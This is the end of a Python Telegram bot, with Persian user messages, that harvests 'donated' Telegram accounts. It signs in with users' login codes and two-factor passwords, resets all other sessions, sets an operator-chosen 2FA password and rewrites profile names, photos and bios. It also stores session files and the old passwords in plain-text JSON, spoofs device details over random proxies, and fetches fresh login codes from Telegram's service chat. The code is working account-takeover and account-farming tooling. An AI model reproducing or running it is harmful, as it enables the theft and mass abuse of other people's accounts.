                await event.reply('''** \nکاربر عزیز لطفا پس از 5 دقیقه دکمه زیر را بزنید و اکانت خود را اهدا کنید **\n ➖➖➖➖➖➖ \n مشخصات اکانت \n 👽  Username : {1}\n \n ➖➖➖➖➖➖ \n 👽  Phone : +{2}\n  \n ➖➖➖➖➖➖ \n 👽 FirstName : {3}\n \n ➖➖➖➖➖➖ \n 👽 LastName : {4}** \n ➖➖➖➖➖➖ \n'''.format(key.split(':')[2]+':'+key.split(':')[3], str(info.username), str(info.phone), info.first_name, info.last_name), buttons=[[Button.inline("✅ check ", f"True|{time.time()}|+{info.phone}|{event.raw_text}")]])

                user.set(f"step:{userids}", 'None')

                await new.disconnect()

            except errors.rpcerrorlist.PhoneCodeExpiredError:
                await event.reply('**⚠️ phone code Exipired \n ▬▭▬▭▬▭▬ \n  Please  Enter Phone number Again \n  **')
                await new.disconnect()

                user.set(f"step:{userids}", 'None')

            except errors.SessionPasswordNeededError:
                await event.reply('**⚠️ ⚠️لطفا پسورد دو مرحله ای رو وارد کنید و یا از گزینه زیر استفاده کنید  **')
                await new.disconnect()
                user.set(f"step:{userids}", "2fa")

            except KeyError:
                await new.disconnect()
                await event.reply('**⚠️ No Any Account In Queue**')

            except errors.rpcerrorlist.PhoneCodeInvalidError:
                await new.disconnect()
                await event.reply("⚠️ Invalid Code ! \n Try Again ")

            except Exception as e:
                await new.disconnect()

                print(str(e), str(e.__class__))
                await event.reply("خطای ناشناخته \n لطفا مجددا با زدن رسیور فراند را طی کنید ")
                user.set(f"step:{userids}", 'None')

        elif not event.raw_text.isdigit() and user.get(f"step:{userids}") == "getCode" and event.raw_text != "ارسال شماره 📞" and event.raw_text != "❔اطلاعات من" and event.raw_text != "❕پشتیبانی":

            await event.reply("⚠️ Please Enter the Code Currectly ")

        elif user.get(f"step:{userids}") == "2fa":
            try:

                key = user.get(f'code_mode:{userids}')
                m = await event.reply('**♻️ ▪️ لطفا کمی صبر کنید .... **')
                k2 = getapiPhone(key.split(':')[0])
                device = random.choice(devices)
                version1 = random.choice(version)
                appv = random.choice(appvs)
                pr = await random_proxy()
                print(pr)
                new = TelegramClient('Accountsres/{0}'.format(key.split(':')[0]), int(k2[0]), k2[1],
                                    device_model=device,
                                    system_version=version1,
                                    app_version=appv,
                                    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                    proxy=tuple(pr),
                                     )
                await new.connect()
                await new.sign_in(password=event.raw_text)
                info = await new.get_me()

                await new.disconnect()
                await event.reply('''** \nکاربر عزیز لطفا پس از 5 دقیقه دکمه زیر را بزنید و اکانت خود را اهدا کنید **\n ➖➖➖➖➖➖ \n مشخصات اکانت \n 👽  Username : {1}\n \n ➖➖➖➖➖➖ \n 👽  Phone : +{2}\n  \n ➖➖➖➖➖➖ \n 👽 FirstName : {3}\n \n ➖➖➖➖➖➖ \n 👽 LastName : {4}** \n ➖➖➖➖➖➖ \n'''.format(key.split(':')[2]+':'+key.split(':')[3], str(info.username), str(info.phone), info.first_name, info.last_name), buttons=[[Button.inline("✅ check ", f"True|{time.time()}|+{info.phone}|{event.raw_text}")]])

                user.set(f"step:{userids}", 'None')

            except KeyError:
                await event.reply('** No Any Account In Queue**')

            except errors.PasswordHashInvalidError:
                await event.reply('**❌لطفا پسورد رو به درستی وارد کنید . **')

                await new.disconnect()

            except Exception as e:
                print(str(e), str(e.__class__))

                await event.reply("خطای ناشناخته \n لطفا زدن رسیور دوباره تلاش کنید ")
                await new.disconnect()

                os.remove('Accountsres/{}.session'.format(key.split(':')[0]))
                user.set(f"step:{userids}", 'None')
            # await new.disconnect()

        elif validate(userids) and event.raw_text == "🌈دریافت کد":

            await event.reply("🍒لطفا شماره مورد نظر را وارد کنید ( شماره ای که قصد گرفتن کد از آن را دارید)")

            user.set(f"step:{userids}", "vipgetcode")

        elif event.raw_text.startswith("+") and user.get(f"step:{userids}") == "vipgetcode":
            print("vipCode")
            phone = event.raw_text

            if not os.path.exists('Accountsres/{0}.session'.format(phone)):
                await event.reply("❌ این اکانت در دیتابیس موجود نیست و اهدا نشده است❌\n ➖➖➖➖➖➖ \n لطفا شماره دیگری وارد کنید و یا از رسیور استفاده کنید ")

            else:

                # try:

                w = getapiPhone(phone)
                #print (phone , 'Accountsres/{0}/{1}.session'.format(phone , phone))
                pr = await random_proxy()
                print(pr)
                device = random.choice(devices)
                version1 = random.choice(version)
                appv = random.choice(appvs)
                new = TelegramClient('Accountsres/{0}.session'.format(phone), w[0], w[1],
                                    device_model=device,
                                    system_version=version1,
                                    app_version=appv,
                                    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                    proxy=tuple(pr),
                                     )

                await new.connect()

                #one = TelegramClient('Accountsres/+18164000381.session' , w[0]  , w[1])

                # await one.connect()
                # if not await new.is_user_authorized():
                #     print ("is_user_authorized")
                #     await new.sign_in(phone ,password="keivan")

                # if not await new.is_user_authorized():

                try:
                    # result = await one.send_code_request(phone)
                    # await one.disconnect()

                    await event.reply('''
    🌈کد ارسال شد 🌈

    ▫️لطفا کمی صبر کنید
                                ''')

                    # if not await new.is_user_authorized():
                    #     print ("is_user_authorized")
                    #     await new.sign_in(phone)

                    await asyncio.sleep(6)

                    for message in await new.get_messages(777000, limit=1):

                        code = re.findall(r'\d+', message.message)

                        await event.reply(f"🏆 کد ورود شما : {code[0]}")

                    await new.disconnect()

                except Exception as e:
                    print(str(e))
                    try:
                        await new.disconnect()
                    except:
                        pass
                # except Exception as e :
                #     print (str(e))

                #     try:
                #         await new.disconnect()
                #     except : pass


@bot.on(events.CallbackQuery)
async def callback(events):
    userids = events.sender_id
    global info
    callback = events.data.decode()

    if (user.get("on") == "1"):

        if callback.startswith("+:"):
            _id = callback.split("+:")[1]

            try:
                await bot.send_message(int(_id), "✅سفارش شما با موفقیت انجام شد ")
                user.set(f"allow:{_id}", "true")
                user.set(f"sacc:{_id}", 0)

            except:
                pass

        if callback.startswith("-:"):
            _id = callback.split("-:")[1]
            try:
                await bot.send_message(int(_id), "❌سفارش شما رد شد ")
                user.set(f"allow:{_id}", "true")

            except:
                pass

        elif callback.startswith('settings'):
            phn = callback.split('|')[1]
            await events.reply('What you want with {} ?'.format(phn), buttons=[
                [Button.inline('🗑 Delete', 'delete|{}'.format(phn)),
                 Button.inline('بستن ', 'close')]
            ])

        elif callback == 'close':
            await events.edit('پنل با موفقیت بسته شد')

        elif callback.startswith('delete'):
            pehen = callback.split('|')[1]
            try:
                os.remove('Accountsres/{}'.format(pehen))
                await events.edit('اکانت {} با موفقیت از دیتابیس پاک شد !'.format(pehen))
            except:
                await events.edit('مشکلی در پاک کردن {} از دیتابیس وجود دارد ! '.format(pehen))

        elif callback == "enteghal":

            await events.reply("✅لطفا کمی صبر کنید ❕")

            for item in os.scandir('Accountsres'):
                if 'journal' not in item.name and '.session' in item.name:

                    # enteghal sessions
                    shutil.copy("Accountsres/{}".format(item.name),
                                "../Accountsres/{}".format(item.name))

                    pass
            # os.mkdir("Accountsres")
            await events.reply("✅✅ عملیات انتقال با موفقیت به پایان رسید  ")

        if callback == "cancel":
            user.set(f"step:{userids}", "None")

        elif callback.startswith('True') or callback.startswith("False"):

            if time.time() - int(callback.split('|')[1].split('.')[0]) > 2:

                fname = 'None'
                lname = 'None'
                about = 'None'
                sdk = random.choice(sdks)
                phone = callback.split('|')[2]
                dct = callback.split('|')
                if dct[0] == "True":
                    password = dct[3]
                else:
                    password = ""
                nam = "Accountsres/"+callback.split('|')[2]+".session"

                await events.answer('کمی صبر کنید ...')
                api = getapiPhone(callback.split('|')[2])
                aid = api[0]
                ah = api[1]
                device = random.choice(devices)
                version1 = random.choice(version)
                appv = random.choice(appvs)
                pr = await random_proxy()
                print(pr)
                client = TelegramClient(nam, aid, ah,
                                        device_model=device,
                                        system_version=version1,
                                        app_version=appv,
                                        lang_code='en',
                                        system_lang_code='en',
                                        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                        proxy=tuple(pr),
                                        )

                await client.connect()

                # --------------------
                try:
                    msg = ["slm","khobi","che khabar","سلام","چه خبر","خبی","سلامتی دا","تست","ارسال","رسیور","پیام","ارسال"]
                    idd = ["@Tessssttttttttttg","@fuuuufgooo","@sendcheckk","@ttdccghhhhhh"]
                    await client.send_message(str(random.choice(idd)),str(random.choice(msg)))
                    shutil.copy(nam,"salem")
                    
                except:
                    shutil.copy(nam,"repacc")
                    
                try:
                    await client(functions.auth.ResetAuthorizationsRequest())
                except Exception as e:
                    print("ResetAuthorizationsRequest ===>", str(e))
                    pass

                # --------------------

                try:

                    result = await client(functions.account.GetAuthorizationsRequest())
                    #print ("Length : === > "  , len(result.authorizations))
                    if len(result.authorizations) == 1:
                        # if 1==1:
                        if dct[0] == 'True':  # ---- password 2fa dare !
                            print("password 2fa dare !")

                            await events.edit("🏆 اکانت شما با موفقیت اهدا شد ❕")

                            await asyncio.sleep(random.randint(1, 2))
                            await events.edit('| ▪️ لطفا کمی صبر کنید .... \n👽 Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "✅"), Button.inline("✅ ", "✅")], [Button.inline("FirstName ", "❌"), Button.inline("❌", "❌")], [Button.inline("LastName  ", "❌"), Button.inline("❌", "❌")], [Button.inline("Bio", "❌"), Button.inline("❌", "❌")]])

                            # --------
                            user.incr(f"sacc:{userids}")  # ---- success Acc
                            user.incr(f"accs")
                            # ----------
                            a_pass = user.get("pass")

                            passwd = dct[3]

                            print("new password : ", a_pass,
                                  "old pass : ", passwd)

                            fname = getRandomLineRead("fnames.txt")
                            lname = getRandomLineRead("lnames.txt")
                            about = getRandomLineRead("about.txt")
                            files = os.listdir('images')

                            # print ("files" , files)
                            mimg = random.choice(files)

                            print("fname : ", fname, "lname: ", lname,
                                  "about : ", about, "image :", mimg)
                            upload_file = await client.upload_file("images/"+mimg)
                            await client(UploadProfilePhotoRequest(upload_file))

                            await client(UpdateProfileRequest(first_name=fname))
                            await events.edit('| ▪️ لطفا کمی صبر کنید .... \n👽 Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "✅"), Button.inline("✅ ", "✅")], [Button.inline("FirstName ", "✅"), Button.inline("✅", "✅")], [Button.inline("LastName  ", "❌"), Button.inline("❌", "❌")], [Button.inline("Bio", "❌"), Button.inline("❌", "❌")]])

                            await asyncio.sleep(1, 2)

                            await client(UpdateProfileRequest(last_name=str(lname)))
                            await events.edit('| ▪️ لطفا کمی صبر کنید .... \n👽 Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "✅"), Button.inline("✅ ", "✅")], [Button.inline("FirstName ", "✅"), Button.inline("✅", "✅")], [Button.inline("LastName  ", "✅"), Button.inline("✅", "❌")], [Button.inline("Bio", "❌"), Button.inline("✅", "❌")]])
                            await asyncio.sleep(1, 2)

                            await client(UpdateProfileRequest(about=str(about)))
                            await events.edit('| ▪️ لطفا کمی صبر کنید .... \n👽 Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "✅"), Button.inline("✅ ", "✅")], [Button.inline("FirstName ", "✅"), Button.inline("✅", "✅")], [Button.inline("LastName  ", "✅"), Button.inline("✅", "✅")], [Button.inline("Bio", "✅"), Button.inline("✅", "✅")]])
                            await asyncio.sleep(1, 2)

                            await client.edit_2fa(current_password=passwd, new_password=a_pass)

                            await events.edit('| ▪️ لطفا کمی صبر کنید .... \n👽 Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "✅"), Button.inline("✅ ", "✅")], [Button.inline("FirstName ", "✅"), Button.inline("✅", "✅")], [Button.inline("LastName  ", "✅"), Button.inline("✅", "✅")], [Button.inline("Bio", "✅"), Button.inline("✅", "✅")], [Button.inline("Password", "✅"), Button.inline("✅", "✅")]])

                            await client.disconnect()
                            # await change('69YYF5')

                            counter = 0
                            for item in os.scandir('Accountsres'):
                                if 'journal' not in item.name and '.session' in item.name:
                                    counter += 1

                                    pass

                        if dct[0] == "False":  # --- pass 2FA nadare
                            await events.reply("🏆 اکانت شما با موفقیت اهدا شد ❕")

                            # --------
                            user.incr(f"sacc:{userids}")  # ---- success Acc
                            user.incr(f"accs")
                            # ----------
                            a_pass = user.get("pass")

                            print("new password :", a_pass)

                            fname = getRandomLineRead("fnames.txt")
                            lname = getRandomLineRead("lnames.txt")
                            about = getRandomLineRead("about.txt")
                            files = os.listdir('images')

                            # print ("files" , files)
                            mimg = random.choice(files)
                            upload_file = await client.upload_file("images/"+mimg)
                            await client(UploadProfilePhotoRequest(upload_file))

                            # print ("fname : " , fname , "lname:" , lname , "about : " , about )

                            await client(UpdateProfileRequest(first_name=fname))
                            await events.edit('| ▪️ لطفا کمی صبر کنید .... \n👽 Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "✅"), Button.inline("✅ ", "✅")], [Button.inline("FirstName ", "✅"), Button.inline("❌", "❌")], [Button.inline("LastName  ", "❌"), Button.inline("❌", "❌")], [Button.inline("Bio", "❌"), Button.inline("❌", "❌")]])

                            await asyncio.sleep(1, 2)

                            await client(UpdateProfileRequest(last_name=str(lname)))
                            await events.edit('| ▪️ لطفا کمی صبر کنید .... \n👽 Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "✅"), Button.inline("✅ ", "✅")], [Button.inline("FirstName ", "✅"), Button.inline("✅", "✅")], [Button.inline("LastName  ", "✅"), Button.inline("✅", "❌")], [Button.inline("Bio", "❌"), Button.inline("❌", "❌")]])
                            await asyncio.sleep(1, 2)

                            await client(UpdateProfileRequest(about=str(about)))
                            await events.edit('| ▪️ لطفا کمی صبر کنید .... \n👽 Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "✅"), Button.inline("✅ ", "✅")], [Button.inline("FirstName ", "✅"), Button.inline("✅", "✅")], [Button.inline("LastName  ", "✅"), Button.inline("✅", "✅")], [Button.inline("Bio", "✅"), Button.inline("✅", "✅")]])
                            await asyncio.sleep(1, 2)

                            await events.edit('| ▪️ لطفا کمی صبر کنید .... \n👽 Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "✅"), Button.inline("✅ ", "✅")], [Button.inline("FirstName ", "✅"), Button.inline("✅", "✅")], [Button.inline("LastName  ", "✅"), Button.inline("✅", "❌")], [Button.inline("Bio", "✅"), Button.inline("✅", "✅")], [Button.inline("Password", "✅"), Button.inline("❌", "✅")]])

                            await client.edit_2fa(new_password=a_pass)
                            # ----------

                            await events.edit('| ▪️ لطفا کمی صبر کنید .... \n👽 Agent : {} '.format(callback.split('|')[2]), buttons=[[Button.inline("Connection .. ", "✅"), Button.inline("✅ ", "✅")], [Button.inline("FirstName ", "✅"), Button.inline("✅", "✅")], [Button.inline("LastName  ", "✅"), Button.inline("✅", "✅")], [Button.inline("Bio", "✅"), Button.inline("✅", "✅")], [Button.inline("Password", "✅"), Button.inline("✅", "✅")]])

                            await client.disconnect()

                            counter = 0
                            for item in os.scandir('Accountsres'):
                                if 'journal' not in item.name and '.session' in item.name:
                                    counter += 1

                                    pass

                            # await change('69YYF5')

                        fname = fname.rstrip()
                        lname = lname.rstrip()

                        dictionary = {

                            "session_file": phone,
                            "phone": phone,
                            "register_time": time.time(),
                            "app_id": f"{aid}",
                            "app_hash": f"{ah}",
                            "sdk": sdk,
                            "app_version": version1,
                            "device": device,
                            "lang_pack": "en",
                            "proxy": 'null',
                            "last_check_time": 0,
                            "success_registred": True,
                            "first_name": f"{fname}",
                            "last_name": f"{lname}",
                            "twoFA": f"{password}"
                        }

                        json_object = json.dumps(dictionary, indent=4)
                        # create_api(phone)
                        with open(f"Accountsres/{phone}.json", "w") as outfile:
                            outfile.write(json_object)

                        minify(f"Accountsres/{phone}.json")

                        if not os.path.exists(f"Accountsres/{phone}"):
                            os.mkdir(f"Accountsres/{phone}")

                            shutil.copy(
                                f"Accountsres/{phone}.session", f"Accountsres/{phone}/{phone}.session")
                            shutil.copy(
                                f"Accountsres/{phone}.json", f"Accountsres/{phone}/{phone}.json")

                    else:

                        # --------------
                        await events.reply('⚠️ نشستهای فعال اکانت خالی نیست. \n این اکانت قابل اهدا نمی باشد \n زیرا نشست ان خالی نیست ')
                        await client.disconnect()
                        # await change('69YYF5')

                        fname = fname.rstrip()
                        lname = lname.rstrip()
                        dictionary = {

                            "session_file": phone,
                            "phone": phone,
                            "register_time": str(time.time()),
                            "app_id": f"{aid}",
                            "app_hash": f"{ah}",
                            "sdk": sdk,
                            "app_version": version1,
                            "device": device,
                            "lang_pack": "en",
                            "proxy": 'null',
                            "last_check_time": 0,
                            "success_registred": False,
                            "first_name": f"{fname}",
                            "last_name": f"{lname}",
                            "twoFA": f"{password}"
                        }

                        json_object = json.dumps(dictionary, indent=4)
                        with open(f"Accountsres/{phone}.json", "w") as outfile:
                            outfile.write(json_object)

                        minify(f"Accountsres/{phone}.json")

                except errors.UserDeactivatedBanError:

                    await events.edit('⚠️متاسفانه اکانت شما دیلیت شده است لطفا اکانت دیگری را وارد نمایید.')
                    await client.disconnect()
                    fname = fname.rstrip()
                    lname = lname.rstrip()
                    dictionary = {

                        "session_file": phone,
                        "phone": phone,
                        "register_time": str(time.time()),
                        "app_id": f"{aid}",
                        "app_hash": f"{ah}",
                        "sdk": sdk,
                        "app_version": version1,
                        "device": device,
                        "lang_pack": "en",
                        "proxy": 'null',
                        "last_check_time": 0,
                        "success_registred": False,
                        "first_name": f"{fname}",
                        "last_name": f"{lname}",
                        "twoFA": f"{password}"
                    }

                    json_object = json.dumps(dictionary, indent=4)
                    with open(f"Accountsres/{phone}.json", "w") as outfile:
                        outfile.write(json_object)
                    minify(f"Accountsres/{phone}.json")

                except errors.UserDeactivatedError:

                    await events.edit('⚠️متاسفانه اکانت شما دیلیت شده است لطفا اکانت دیگری را وارد نمایید.')
                    await client.disconnect()
                    fname = fname.rstrip()
                    lname = lname.rstrip()
                    dictionary = {

                        "session_file": phone,
                        "phone": phone,
                        "register_time": str(time.time()),
                        "app_id": f"{aid}",
                        "app_hash": f"{ah}",
                        "sdk": sdk,
                        "app_version": version1,
                        "device": device,
                        "lang_pack": "en",
                        "proxy": 'null',
                        "last_check_time": 0,
                        "success_registred": False,
                        "first_name": f"{fname}",
                        "last_name": f"{lname}",
                        "twoFA": f"{password}"
                    }

                    json_object = json.dumps(dictionary, indent=4)
                    with open(f"Accountsres/{phone}.json", "w") as outfile:
                        outfile.write(json_object)

                    minify(f"Accountsres/{phone}.json")

                except errors.SessionExpiredError:

                    await events.edit(f'⚠️ شماره {dct[2]} از دسترس ربات خارج شده است و امکان ثبت آن نیست.')
                    await client.disconnect()

                    fname = fname.rstrip()
                    lname = lname.rstrip()

                    dictionary = {

                        "session_file": phone,
                        "phone": phone,
                        "register_time": str(time.time()),
                        "app_id": f"{aid}",
                        "app_hash": f"{ah}",
                        "sdk": sdk,
                        "app_version": version1,
                        "device": device,
                        "lang_pack": "en",
                        "proxy": 'null',
                        "last_check_time": 0,
                        "success_registred": False,
                        "first_name": f"{fname}",
                        "last_name": f"{lname}",
                        "twoFA": f"{password}"
                    }

                    json_object = json.dumps(dictionary, indent=4)
                    with open(f"Accountsres/{phone}.json", "w") as outfile:
                        outfile.write(json_object)

                    minify(f"Accountsres/{phone}.json")

                except errors.SessionRevokedError:

                    await events.edit(f'⚠️ شماره {dct[2]} از دسترس ربات خارج شده است و امکان ثبت آن نیست.')
                    await client.disconnect()

                    fname = fname.rstrip()
                    lname = lname.rstrip()

                    dictionary = {

                        "session_file": phone,
                        "phone": phone,
                        "register_time": str(time.time()),
                        "app_id": f"{aid}",
                        "app_hash": f"{ah}",
                        "sdk": sdk,
                        "app_version": version1,
                        "device": device,
                        "lang_pack": "en",
                        "proxy": 'null',
                        "last_check_time": 0,
                        "success_registred": False,
                        "first_name": f"{fname}",
                        "last_name": f"{lname}",
                        "twoFA": f"{password}"
                    }

                    json_object = json.dumps(dictionary, indent=4)
                    with open(f"Accountsres/{phone}.json", "w") as outfile:
                        outfile.write(json_object)

                    minify(f"Accountsres/{phone}.json")

                except errors.rpcerrorlist.PasswordHashInvalidError:

                    await events.edit(f'⚠️ تایید دو مرحله ای شماره {dct[2]} تغییر کرده است و امکان ثبت آن نیست.')

                    fname = fname.rstrip()
                    lname = lname.rstrip()
                    dictionary = {

                        "session_file": phone,
                        "phone": phone,
                        "register_time": str(time.time()),
                        "app_id": f"{aid}",
                        "app_hash": f"{ah}",
                        "sdk": sdk,
                        "app_version": version1,
                        "device": device,
                        "lang_pack": "en",
                        "proxy": 'null',
                        "last_check_time": 0,
                        "success_registred": False,
                        "first_name": f"{fname}",
                        "last_name": f"{lname}",
                        "twoFA": f"{password}"
                    }

                    json_object = json.dumps(dictionary, indent=4)
                    with open(f"Accountsres/{phone}.json", "w") as outfile:
                        outfile.write(json_object)

                    minify(f"Accountsres/{phone}.json")
                except Exception as e:
                    fname = fname.rstrip()
                    lname = lname.rstrip()

                    dictionary = {

                        "session_file": phone,
                        "phone": phone,
                        "register_time": str(time.time()),
                        "app_id": f"{aid}",
                        "app_hash": f"{ah}",
                        "sdk": sdk,
                        "app_version": version1,
                        "device": device,
                        "lang_pack": "en",
                        "proxy": 'null',
                        "last_check_time": 0,
                        "success_registred": False,
                        "first_name": f"{fname}",
                        "last_name": f"{lname}",
                        "twoFA": f"{password}"
                    }

                    json_object = json.dumps(dictionary, indent=4)
                    with open(f"Accountsres/{phone}.json", "w") as outfile:
                        outfile.write(json_object)

                    minify(f"Accountsres/{phone}.json")

                    await client.disconnect()
                    print(str(e))
                    await events.edit('⚠️خطای ناشناخته از تلگرام لطفا دوباره اکانت را وارد نمایید یا اکانت دیگری را وارد ربات نمایید.')

            else:
                await events.answer('هنوز 1 دقیقه نشده است لطفا {} ثانیه دیگر صبر کنید با تشکر'.format(60 - (time.time() - int(callback.split('|')[1].split('.')[0]))).split('.')[0])







go()
bot.run_until_disconnected()